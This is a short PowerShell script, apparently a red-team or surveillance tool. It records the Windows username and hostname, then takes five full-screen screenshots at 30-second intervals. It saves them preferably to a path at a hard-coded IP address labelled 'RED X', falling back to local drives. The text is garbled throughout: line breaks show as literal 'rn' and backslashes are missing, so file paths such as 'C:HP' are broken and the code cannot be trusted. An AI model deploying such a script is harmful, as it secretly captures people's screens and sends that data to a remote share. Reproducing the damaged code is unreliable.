#############################################################################rn# Capturing a screenshotrn# Written by: sil3n7hrn#############################################################################rn$username="$env:UserName"rnWrite-Output $usernametrn$hname="$env:computername"rnWrite-Output $hnametrnrn$i=1rnWhile ($i -le 5){rnrn$time=Get-Date -format "dd-MMM-yyyy-HH-mm-ss"rnWrite-Output $timernrn# Check to see if path to RED X existsrnif (Test-Path 143.16.176.125x) {rn$File = "143.16.176.125x" + $username + "_" + $hname + "_" + $time + ".jpg"rn}rnElseIf (Test-Path C:HP) {rn$File = "C:HP" + $username + "_" + $time + ".jpg"rn}rnElseIf (Test-Path C:) {rn$File = "C:" + $username + "_" + $time + ".jpg"rn}rnElse {rn# You are shit out of luckrnexitrn}rnrnAdd-Type -AssemblyName System.Windows.FormsrnAdd-type -AssemblyName System.Drawingrn# Gather Screen resolution informationrn$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreenrn$Width = $Screen.Widthrn$Height = $Screen.Heightrn$Left = $Screen.Leftrn$Top = $Screen.Toprn# Create bitmap using the top-left and bottom-right boundsrn$bitmap = New-Object System.Drawing.Bitmap $Width, $Heightrn# Create Graphics objectrn$graphic = [System.Drawing.Graphics]::FromImage($bitmap)rn# Capture screenrn$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)rn# Save to filern$bitmap.Save($File, ([system.drawing.imaging.imageformat]::jpeg)) rnWrite-Output "Screenshot saved to:"rnWrite-Output $Filernrn$graphic.dispose()rn$bitmap.dispose()rnrnStart-Sleep -Seconds 30rn$i++rn}rnrnexit